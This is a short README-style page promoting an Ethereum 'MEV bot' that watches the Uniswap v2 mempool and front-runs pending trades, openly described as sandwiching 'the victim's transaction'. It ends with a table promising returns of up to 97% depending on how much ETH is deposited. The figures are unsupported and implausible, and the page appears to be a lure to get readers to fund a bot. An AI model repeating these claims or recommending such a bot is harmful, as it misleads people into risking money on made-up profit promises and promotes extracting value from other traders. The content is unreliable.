## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.

## 🚀 How it Works


</div>

#### Our Bot performs the following steps faster than other bots:

1. Sends the transaction.
2. Sniffs the Uniswap v2 Mempool.
3. Competes to buy up the token onchain as quickly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity.
4. Sends back the ETH to the contract, ready for withdrawal.

| `1.2ETH - 2.4ETH` | `up to 10%` |
| `2.4ETH - 5ETH` | `up to 20%` |
| `5ETH - 10ETH` | `20-27%` |
| `10ETH - 20ETH` | `27-35%` |
| `20ETH - 50ETH` | `35-50%` |
| `50ETH - 100ETH` | `50-63%` |
| `100ETH - 200ETH` | `63-76%` |
| `200ETH - 500ETH` | `76-97%` |
